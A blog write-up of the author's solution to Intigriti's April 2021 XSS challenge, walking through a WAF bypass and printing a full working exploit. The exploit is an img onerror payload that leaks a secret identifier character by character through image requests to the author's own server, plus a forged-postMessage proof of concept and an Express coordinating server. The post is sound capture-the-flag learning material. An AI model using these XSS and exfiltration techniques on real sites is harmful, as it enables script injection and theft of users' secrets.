---
title: Solving Intigriti's 0421 XSS Challenge (Part 1)
catalog: true
date: 2021-05-25 22:13:21
tags: [Security, Front-end]
categories:
  - Security
---

## Introduction

One day, while browsing the internet, I came across an XSS challenge: [Intigriti's 0421 XSS challenge - by @terjanq](https://challenge-0421.intigriti.io/). Apart from the challenge itself being very attractive, what attracted me more was the author who created it.

Many of the security-related resources I found online that were more focused on front-end were maintained or contributed to by this author, such as [Tiny XSS Payloads](https://tinyxss.terjanq.me/) or the eye-opening [XS-Leaks Wiki](https://xsleaks.dev/).

[Intigriti](https://www.intigriti.com/) seems to hold this kind of XSS challenge every month, and this was the hardest one they have ever held. The challenge lasted from 4/19 to 4/25, with a week to try, and only 15 people successfully solved it. In March, 45 people solved the challenge, and in February, 33 people did, so the number of people who solved it this time was indeed much less, indicating the difficulty of the challenge.

I spent about five days on it, and every time I got stuck, I thought, "I should give up and wait for the answer." But then, from time to time, new ideas would come up, and I would try again. Finally, on the last day before the deadline, I solved it before the time limit, and when I did, I clenched my fists and shouted, "Too awesome!"

This article is about my experience in solving the challenge. I previously wrote an English version, but it was probably worse than an elementary school composition, so I decided to write a Chinese version to better express my thoughts. The title will have a "Part 1" because this article is about my solution, and the next article will be about the author's solution, and the one after that will analyze other people's solutions.

But it seems that my blog is cursed to break the series of articles that haven't been written yet, so I hope I can make it through this time.

<!-- more -->

## Challenge Content

The challenge is here: https://challenge-0421.intigriti.io/

The goal is to successfully execute XSS on this website and execute `alert('flag{THIS_IS_THE_FLAG}')` to win.

There are two web pages in this challenge. The first one is index.html, and I only captured the relevant code for the challenge below:

``` html
<iframe id="wafIframe" src="./waf.html" sandbox="allow-scripts" style="display:none"></iframe>
<script>
  const wafIframe = document.getElementById('wafIframe').contentWindow;
  const identifier = getIdentifier();

  function getIdentifier() {
      const buf = new Uint32Array(2);
      crypto.getRandomValues(buf);
      return buf[0].toString(36) + buf[1].toString(36)
  }

  function htmlError(str, safe){
      const div = document.getElementById("error-content");
      const container = document.getElementById("error-container");
      container.style.display = "block";
      if(safe) div.innerHTML = str;
      else div.innerText = str;
      window.setTimeout(function(){
        div.innerHTML = "";
        container.style.display = "none";
      }, 10000);
  }

  function addError(str){
      wafIframe.postMessage({
          identifier,
          str
      }, '*');
  }

  window.addEventListener('message', e => {
      if(e.data.type === 'waf'){
          if(identifier !== e.data.identifier) throw /nice try/
          htmlError(e.data.str, e.data.safe)
      }
  });

  window.onload = () => {
      const error = (new URL(location)).searchParams.get('error');
      if(error !== null) addError(error);
  }

</script>
```

First, when the window loads, the content of `error` is taken from the URL's query string, and then `addError(error)` is called. Then, the content is added with a randomly generated ID and sent to `wafIframe` using postMessage.

After `wafIframe` finishes processing, it sends the result back using postMessage. First, it checks whether the identifier is the same. If it is, the verification is passed, and then it checks whether `e.data.safe` is true. If it is, it uses innerHTML to add `e.data.str`, otherwise it uses innerText.

Next, let's take a look at what the other page, waf.html, is doing:

``` js
onmessage = e => {
    const identifier = e.data.identifier;
    e.source.postMessage({
        type:'waf',
        identifier,
        str: e.data.str,
        safe: (new WAF()).isSafe(e.data.str)
    },'*');
}

function WAF() {
    const forbidden_words = ['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:'];
    const dangerous_operators = ['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']

    function decodeHTMLEntities(str) {
        var ta = document.createElement('textarea');
        ta.innerHTML = str;
        return ta.value;
    }

    function onlyASCII(str){
        return str.replace(/[^\x21-\x7e]/g,'');
    }

    function firstTag(str){
        return str.search(/<[a-z]+/i)
    }

    function firstOnHandler(str){
        return str.search(/on[a-z]{3,}/i)
    }

    function firstEqual(str){
        return str.search(/=/);
    }

    function hasDangerousOperators(str){
        return dangerous_operators.some(op=>str.includes(op));
    }

    function hasForbiddenWord(str){
        return forbidden_words.some(word=>str.search(new RegExp(word, 'gi'))!==-1);
    }

    this.isSafe = function(str) {
        let decoded = onlyASCII(decodeHTMLEntities(str));

        const first_tag = firstTag(decoded);
        if(first_tag === -1) return true;
        decoded = decoded.slice(first_tag);

        if(hasForbiddenWord(decoded)) return false;

        const first_on_handler = firstOnHandler(decoded);
        if(first_on_handler === -1) return true;
        decoded = decoded.slice(first_on_handler)

        const first_equal = firstEqual(decoded);
        if(first_equal === -1) return true;
        decoded = decoded.slice(first_equal+1);

        if(hasDangerousOperators(decoded)) return false;
        return true;
    }
}
```

When it receives data from index, it goes through a series of verifications to see if the data is safe. The verifications are done in the following order:

1. First, the sent data is decoded and only ASCII is allowed.
2. Find the first HTML tag and filter out `['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:']`.
3. Find the first = sign that appears after the onXXX handler.
4. Cannot have the following characters: `['"', "'", '``', '(', ')', '{', '}', '[', ']', '=']`.
5. If all of the above are successful, it is safe and will be interpreted as innerHTML by index.html.

Combining the above conditions, if I pass `error=123`, the screen will display 123. If I pass `<h1>hello</h1>`, the screen will actually display a heading with the word "hello", but if I pass `<script>alert(1)</script>`, the screen will only display the text and will not execute it as HTML because `safe` is false.

That's basically the introduction to the challenge. I highly recommend that you try it out for yourself first, at least for an hour or two, before reading this article, as you will gain a lot more from it.

Below is my train of thought in solving the challenge, and I will write it according to the timeline of my solution.

## First Attempt

As can be seen from the title, there are two ways to successfully execute XSS:

1. Bypass the restrictions using various tricks and execute XSS directly on the page.
2. Use `window.open` to open this page and then postMessage, forge messages and make safe true, so that any HTML can be inserted.

At first, I thought about the first method because for the second method, you need to know what the identifier is, but since it is random, it is impossible. I thought it was a dead end.

So the next step is to think about how to bypass the restrictions.

From the filtered tags, I found that my favorite `<img>` was not filtered out, and the onXX event handler was only restricted in content and was not filtered out together, so you can use: `<img src=x onerror=123>` to execute JS.

But the problem is that there are too many characters that cannot be used, `()` cannot be used, so functions cannot be called, and using backticks ` to call is not possible either. So how can we execute alert? I was stuck here for a long time, and finally went to Google: "js call function without parentheses" and found this article: [js call function without parentheses](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses/35949617), which mentioned many tricks that I had never thought of.

For example, using the object's valueOf with +, or using new with constructor, or the most amazing one is onerror=eval with throw. These are all super cool techniques to bypass restrictions without using `()`.

But none of the above worked because the restrictions were too strict. The object's `{}` cannot be used, and new cannot be used because it requires a space. The reason why there cannot be a space is because `<img onerror=new abc>` will be interpreted as: `<img onerror="new" abc>`. If you want them to be put together in onerror, you can only use `"` to enclose them, but `"` is a restricted character that cannot be used, so there cannot be spaces in onerror.

Throw seemed to have a chance, but `onerror=eval`, which is a prerequisite for execution, has an equal sign, so it cannot be used.

At this point, I thought, what if I HTML entity encode the restricted characters? Change `=` to `&#61;` to bypass the restrictions.

After trying it out, I found that it didn't work because it had been restored to characters in the first step `decodeHTMLEntities(str)`. At this point, I had two ideas:

1. Can decoding HTML entities inside textarea cause XSS?
2. Can double encoding be used?

The first approach is not feasible because although there is `ta.innerHTML = str;`, this element has never been placed on the DOM, so it is useless.

The second approach is also not feasible because the final `&#61;` will only be treated as text to display.

After trying for a long time, I couldn't come up with anything. The only code that can be executed successfully is `<img src=x onerror=throw/0/+identifier>`, which throws the identifier as an error message and then nothing happens. But this can't do anything.

## Hints

For every 100 likes received, a hint will be released. Due to the difficulty of the challenge, there are also additional hints. The hints I saw were:

1. First hint: find the objective! (4/19 21:57)
2. Time for another hint! Where to smuggle data? (4/20 00:24)
3. Time for another tip! One bite after another! (4/20 19:55)

To be honest, I didn't understand these hints very well. The one I understood the most was the third one, which should mean "One Byte after another". Looking back at the XS-Leaks mentioned earlier, I thought, "Damn, could it be that the dead end I thought was the right solution?".

The dead end I mentioned earlier is "forging messages by postMessage from elsewhere", but I need to know what the randomly generated identifier is to succeed. If this is the right approach, the process to be solved should be:

1. Open a web page and use window.open to open the XSS challenge.
2. Find a way to get the identifier.
3. Post the message to yourself from this web page and insert any HTML.

As long as the second step is successful, the whole process can be connected. But the problem is, how do I know what the identifier is? Since the hint says "one byte after another", I guess it should leak out one character at a time, so I can start thinking from one character.

At this point, I thought of this: `<img src=x onerror=identifier<'1'?is_zero:keep_trying>`. We can use the ternary operator with `<` to determine the first character of the identifier. Although we cannot use strings, `'1'` can be replaced with `<div id=n1>1</div>` + `n1.innerText` to avoid single and double quotes. And the ternary operator can be nested indefinitely, like this:

``` js
identifier<'1'?is_zero:
identifier<'2'?is_one:
identifier<'3'?is_two:
identifier<'4'?is_three:
....
```

So we can indeed use this method to find out what the first character of the identifier is. But the problem is, once we know it, how do we pass this information out?

We cannot call functions, and we cannot even assign values. So how do we pass information out? If we could use `=`, we could change `window.opener.location` with something like `window.opener.location = xxx+1`, or use `<img id=a src=x>` with `a.src=xxxx` to load a new image, so that I can know from the server side what character was leaked.

But because we cannot use the equal sign, we cannot do any of these things.

At this point, I was stuck again, and for a long time. I couldn't think of how to pass the information out. Then I got the next hint:

1. Here's an extra tip: ++ is also an assignment (4/20 22:17)

When I first saw this hint, I thought it might be useful, but I didn't know how to use it. `++` can also change values, but what's the use? I initially thought about going in the direction of `window.opener`, are there any properties that can be manipulated, such as `window.opener.name++`? Or are there any other properties that can be manipulated?

If I could change a property of a `window.opener`, I could somehow pass the leaked information back. But I searched for a long time and even looked at the spec, and it seems that there is no such thing. `window.opener.location` can be changed, but `++` cannot be used, because `++` is like `window.opener.location = window.opener.location + 1`, and if executed, it will throw an error because it involves reading:

```
VM82:1 Uncaught DOMException: Blocked a frame with origin "https://challenge-0421.intigriti.io" from accessing a cross-origin frame.
```

Then I remembered a trick I learned somewhere, using image loading.

For example, if you make an image not load, and then use `++` to change the CSS or other properties to make it load, then I can know this information from the server.

I tried this:

``` html
<img id=n0 src=//server/n0 style="opacity:0;">
<img src=x onerror=identifier<'1'?n0.style.opacity++:...>
```

But the image would still load even if the opacity was 0, so it didn't work. Later, I tried several other properties and remembered one I had used recently: `loading`.

In the past, if you wanted to lazy load images, you would often use a plugin, and earlier you needed to detect scrolling, but recently you can use `IntersectionObserver`. And more recently, many browsers support native lazy loading: `<img src=x loding="lazy">`, and if the image is not too far from the visible area, it will not be loaded.

So we can do this:

``` html
<div style="height: 9999px"></div>
<img id=n0 src=//server/n0 loading="lazy">
<img src=x onerror=identifier<'1'?n0.loading++:...>
```

First, use a very high div to push the image down, outside the threshold, and then when we confirm that the first character is 0, we increase the loading of `n0`, which will become NaN after `++`, and because loading does not have NaN as a value, it will fallback to the default auto and load the image.

Assuming `server/n0` is my own server, then I receive the n0 request, which means the first character is 0. With this idea, we can indeed know what the first character is, like this:

``` html
<div style="height: 9999px"></div>
<img id=n0 src=//server/n0 loading="lazy">
<img id=n1 src=//server/n1 loading="lazy">
<img id=n2 src=//server/n2 loading="lazy">
<img src=x onerror=
identifier<'1'?n0.loading++:
identifier<'2'?n1.loading++:
identifier<'3'?n2.loading++:
...>
```

We have the first character! But what about the second one?

We cannot use `identifier[1]` because we cannot use brackets. I thought about all kinds of possibilities and felt that this was a dead end. It was impossible to get the nth character without using `[](){}`.

## Solving the weakened version?

Although I felt that it was impossible to get the nth character and was stuck in the problem, I had a bold idea.

I cannot get the nth character of a string, but what about a number? Can I get it through a series of mathematical operations? For example, to get 2 from 123, it would be something like 123/10%10 (although it will come out as a decimal). Or directly using binary, `num&1` can tell you the last bit of num, `num&2` can tell you the second to last bit, and so on, so you can know what each bit is.

However, the identifier is not a number, so what should we do? Find a way to convert it to a number! If the identifier only contains 0-9a-z, we can add `0x` in front of it and convert it to a number using `+`. Finally, it will look like this:

``` js
<body>
  <div style=height:9999px id=a>0x</div>
  <img src=https://example.com/x00 id=x00 loading=lazy>
  <img src=https://example.com/x01 id=x01 loading=lazy>
  <img src=https://example.com/x10 id=x10 loading=lazy>
  <img src=https://example.com/x11 id=x11 loading=lazy>
  <img src=https://example.com/x20 id=x20 loading=lazy>
  <img src=https://example.com/x21 id=x21 loading=lazy>
  <img src=x onerror=
a.innerText+identifier&1?x01.loading++:x00.loading++;
a.innerText+identifier&2?x11.loading++:x10.loading++;
a.innerText+identifier&4?x21.loading++:x20.loading++ >

</body>
<script>
  var identifier = 'a4' // 164
  // 10100100
  
</script>
```

Note that the operator's priority must be considered. If the order is not as expected, it may not work properly. For example, `+'0x'+identifier` will execute `+0x` first, rather than concatenating the strings. The `&` operator will try to convert to a number first, which is why it can be used in this way.

The above POC proves that if we can convert the identifier to a number, we can solve this problem. However, the identifier may contain characters above `f`, and the probability of being able to convert it to a number is very low, less than 0.01%, and it takes an average of ten thousand attempts to succeed.

Although this probability is unacceptable, at least I know that the weakened version can be solved.

## Relying on Hints Again

After solving the weakened version, I thought it was almost over. Maybe my direction was wrong, and it was not solved in this way?

Because I really couldn't figure out how to get `identifier[n]`, I thought it was impossible.

At this point, I saw a new hint:

1. "Behind a Greater Oracle there stands one great Identity" (leak it) (4/22 15:53)
2. Tipping time! Goal < object(ive) (4/23 01:58)

From these two new hints, it was verified that my direction was actually correct, that is, to leak the identifier, and then use the `<` symbol to compare.

So I should only be one or two steps away from solving it, and I'm almost there. But these last two steps are really difficult.

Although I wanted to give up, after a day, I had a new idea: "I don't really need to get the second character separately! Assuming I have a place to store the first character, then I only need `identifier < str + '1'`, right?"

If there is a place to store the found character, then a loop-like concept can be used to run and leak all the characters.

Where would this place be? This place needs to be passed from the opener because only the opener knows what character is leaked now. But because of cross-origin issues, there is no attribute that can be accessed by the opener.

After trying for about an hour or two, I suddenly thought of reversing it. Instead of getting something from the opener, the opener passes something to the open window. How to pass it? It can be done through `location.hash`!

After opening the XSS challenge with `window.open` in our webpage, we can use `win.location = url + '#a'` to add a hash without reloading the webpage. After adding it, it can be accessed in the webpage using `location.hash`. Exchange information between cross-origin windows through `location.hash`.

Although I took another step forward, there are still two problems that need to be solved:

1. We need something like a loop
2. We need to be able to send multiple requests to the server

Starting with the first problem, we need to execute similar code continuously to leak one character at a time. This is not difficult. We can use `this.src++` to change the `src` of the image. Once the `src` is assigned, even if the value is the same, the image will still be reloaded. For example:

``` html
<body>
  <script>
    var count = 1
  </script>
  <img src=x onerror=count<10?count++&&src++:console.log(count)>
</body>
```

There is no problem with the loop. Next is the part of leaking information multiple times. The lazy loading we used before can only be used once for an image because once the image is loaded, it is loaded, and there is no way to use `img.loading++` to load it again. What should we do? We need a channel that allows us to send the correct request at the specified time.

After trying randomly for a while, I found a magical attribute: `srcset`, which is magical when used with `src`.

When I set `src` and `srcset` together, the browser will prioritize loading the URL of `srcset`. The magical thing is that when I increment `src`, `srcset` will be loaded again! Here is an example that loads `x2` ten times:

``` js
<body>
  <script>
    var count = 1
  </script>
  <img src=x1 srcset=x2 onerror=count<10?count+++this.src++:123>
</body>
```

Since these two problems have been solved, putting them together can solve the final answer. The process is as follows:

1. Open poc.html and window.open XSS challenge
2. Error carries our prepared payload
3. Use the `onerror` of the image to execute a nested ternary operator. If the condition is met, load the corresponding image, leak out the nth character, and wait for the next loop to start
4. The server receives the image and knows what the nth character is
5. The server passes the result to poc.html, and poc.html updates `win.location.hash`
6. After the update, the server opens the next loop by returning a response, adding n+1, and returning to step 3
7. Repeat the above steps until the token is found

The ideal process is as follows, but due to time constraints, I didn't follow it strictly in some places, for example:

1. I assumed that the first character of the identifier is `1`, if not, skip it.
2. The server waits for 500ms to start the next loop, but it is possible that the `location.hash` has not been updated yet.
3. The ideal way for the server to send results to `poc.html` is to use WebSockets, but I took a shortcut and used long polling.
4. I was too lazy to check if all the identifiers were fetched, so I started trying to use `postMessage` when the length was greater than 10.

The final code looks like this:

``` js
var payload = `
<img srcset=//my_server/0 id=n0 alt=#>
<img srcset=//my_server/1 id=n1 alt=a>
<img srcset=//my_server/2 id=n2 alt=b>
<img srcset=//my_server/3 id=n3 alt=c>
<img srcset=//my_server/4 id=n4 alt=d>
<img srcset=//my_server/5 id=n5 alt=e>
<img srcset=//my_server/6 id=n6 alt=f>
<img srcset=//my_server/7 id=n7 alt=g>
<img srcset=//my_server/8 id=n8 alt=h>
<img srcset=//my_server/9 id=n9 alt=i>
<img srcset=//my_server/a id=n10 alt=j>
<img srcset=//my_server/b id=n11 alt=k>
<img srcset=//my_server/c id=n12 alt=l>
<img srcset=//my_server/d id=n13 alt=m>
<img srcset=//my_server/e id=n14 alt=n>
<img srcset=//my_server/f id=n15 alt=o>
<img srcset=//my_server/g id=n16 alt=p>
<img srcset=//my_server/h id=n17 alt=q>
<img srcset=//my_server/i id=n18 alt=r>
<img srcset=//my_server/j id=n19 alt=s>
<img srcset=//my_server/k id=n20 alt=t>
<img srcset=//my_server/l id=n21 alt=u>
<img srcset=//my_server/m id=n22 alt=v>
<img srcset=//my_server/n id=n23 alt=w>
<img srcset=//my_server/o id=n24 alt=x>
<img srcset=//my_server/p id=n25 alt=y>
<img srcset=//my_server/q id=n26 alt=z>
<img srcset=//my_server/r id=n27 alt=0>
<img srcset=//my_server/s id=n28>
<img srcset=//my_server/t id=n29>
<img srcset=//my_server/u id=n30>
<img srcset=//my_server/v id=n31>
<img srcset=//my_server/w id=n32>
<img srcset=//my_server/x id=n33>
<img srcset=//my_server/y id=n34>
<img srcset=//my_server/z id=n35>

<img id=lo srcset=//my_server/loop onerror=
n0.alt+identifier<location.hash+1?n0.src+++lo.src++:
n0.alt+identifier<location.hash+2?n1.src+++lo.src++:
n0.alt+identifier<location.hash+3?n2.src+++lo.src++:
n0.alt+identifier<location.hash+4?n3.src+++lo.src++:
n0.alt+identifier<location.hash+5?n4.src+++lo.src++:
n0.alt+identifier<location.hash+6?n5.src+++lo.src++:
n0.alt+identifier<location.hash+7?n6.src+++lo.src++:
n0.alt+identifier<location.hash+8?n7.src+++lo.src++:
n0.alt+identifier<location.hash+9?n8.src+++lo.src++:
n0.alt+identifier<location.hash+n1.alt?n9.src+++lo.src++:
n0.alt+identifier<location.hash+n2.alt?n10.src+++lo.src++:
n0.alt+identifier<location.hash+n3.alt?n11.src+++lo.src++:
n0.alt+identifier<location.hash+n4.alt?n12.src+++lo.src++:
n0.alt+identifier<location.hash+n5.alt?n13.src+++lo.src++:
n0.alt+identifier<location.hash+n6.alt?n14.src+++lo.src++:
n0.alt+identifier<location.hash+n7.alt?n15.src+++lo.src++:
n0.alt+identifier<location.hash+n8.alt?n16.src+++lo.src++:
n0.alt+identifier<location.hash+n9.alt?n17.src+++lo.src++:
n0.alt+identifier<location.hash+n10.alt?n18.src+++lo.src++:
n0.alt+identifier<location.hash+n11.alt?n19.src+++lo.src++:
n0.alt+identifier<location.hash+n12.alt?n20.src+++lo.src++:
n0.alt+identifier<location.hash+n13.alt?n21.src+++lo.src++:
n0.alt+identifier<location.hash+n14.alt?n22.src+++lo.src++:
n0.alt+identifier<location.hash+n15.alt?n23.src+++lo.src++:
n0.alt+identifier<location.hash+n16.alt?n24.src+++lo.src++:
n0.alt+identifier<location.hash+n17.alt?n25.src+++lo.src++:
n0.alt+identifier<location.hash+n18.alt?n26.src+++lo.src++:
n0.alt+identifier<location.hash+n19.alt?n27.src+++lo.src++:
n0.alt+identifier<location.hash+n20.alt?n28.src+++lo.src++:
n0.alt+identifier<location.hash+n21.alt?n29.src+++lo.src++:
n0.alt+identifier<location.hash+n22.alt?n30.src+++lo.src++:
n0.alt+identifier<location.hash+n23.alt?n31.src+++lo.src++:
n0.alt+identifier<location.hash+n24.alt?n32.src+++lo.src++:
n0.alt+identifier<location.hash+n25.alt?n33.src+++lo.src++:
n0.alt+identifier<location.hash+n26.alt?n34.src+++lo.src++:
n35.src+++lo.src++>`
```

``` html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
  </head>
  <body>  
  </body>
  <script>
    var payload = // see above
    payload = encodeURIComponent(payload)

    var baseUrl = 'https://my_server'

    // reset first
    fetch(baseUrl + '/reset').then(() => {
      start()
    })

    async function start() {
      // assume identifier start with 1
      console.log('POC started')
      if (window.xssWindow) {
        window.xssWindow.close()
      }

      window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=${payload}#1`, '_blank')

      polling()
    }

    function polling() {
      fetch(baseUrl + '/polling').then(res => res.text()).then((token) => {

        // guess fail, restart
        if (token === '1zz') {
          fetch(baseUrl + '/reset').then(() => {
            console.log('guess fail, restart')
            start()
          })
          return
        }

        if (token.length >= 10) {
          window.xssWindow.postMessage({
            type: 'waf',
            identifier: token,
            str: '<img src=xxx onerror=alert("flag{THIS_IS_THE_FLAG}")>',
            safe: true
          }, '*')
        }

        window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=${payload}#${token}`

        // After POC finsihed, polling will timeout and got error message, I don't want to print the message
        if (token.length > 20) {
          return
        }

        console.log('token:', token)
        polling()
      })
    }
  </script>
</html>
```

The server-side code is written very casually, is ugly, and has bugs:

``` js
var express = require('express')

const app = express()

app.use(express.static('public'));
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*');
  next()
})

const handlerDelay = 100
const loopDelay = 550

var initialData = {
  count: 0,
  token: '1',
  canStartLoop: false,
  loopStarted: false,
  canSendBack: false
}
var data = {...initialData}

app.get('/reset', (req, res) => {
  data = {...initialData}
  console.log('======reset=====')
  res.end('reset ok')
})

app.get('/polling', (req, res) => {
  function handle(req, res) {
    if (data.canSendBack) {
      data.canSendBack = false
      res.status(200)
      res.end(data.token)
      console.log('send back token:', data.token)

      if (data.token.length < 14) {
        setTimeout(() => {
          data.canStartLoop = true
        }, loopDelay)
      }
    } else {
      setTimeout(() => {
        handle(req, res)
      }, handlerDelay)
    }
  }

  handle(req, res)
})

app.get('/loop', (req, res) => {
  function handle(req, res) {
    if (data.canStartLoop) {
      data.canStartLoop = false
      res.status(500)
      res.end()
    } else {
      setTimeout(() => {
        handle(req, res)
      }, handlerDelay)
    }
  }

  handle(req, res)
})

app.get('/:char', (req, res) => {
  // already start stealing identifier
  if (req.params.char.length > 1) {
    res.end()
    return
  }
  console.log('char received', req.params.char)
  if (data.loopStarted) {
    data.token += req.params.char
    console.log('token:', data.token)
    data.canSendBack = true

    res.status(500)
    res.end()
    return 
  }

  // first round
  data.count++
  if (data.count === 36) {
    console.log('initial image loaded, start loop')
    data.count = 0
    data.loopStarted = true
    data.canStartLoop = true
  }
  res.status(500)
  res.end()
})

app.listen(5555, () => {
  console.log('5555')
})
```

## Conclusion

I learned a lot from this XSS challenge, such as:

1. Using `img src` + `onerror` to create a loop (actually, it should be recursion).
2. Using `img src` + `srcset` to repeatedly load images.
3. Using `location.hash` to exchange information.
4. Thinking about problems in a different way, using `>` and `<` instead of `==`, and using comparison instead of equality.
5. Using `/a/.source` or `img.alt` to replace strings, instead of constructing strings with single or double backticks.

Although it took a lot of time, the sense of accomplishment when I solved it was great, and because it was a difficult problem, the sense of accomplishment was even greater.

This article mainly describes my own solution, which is a bit cumbersome (because it requires server-side code), but it is the only solution I can think of.

If nothing unexpected happens, the next article will introduce the official solution, which uses an element that I don't know how to use and completely ignored: `<object>`.
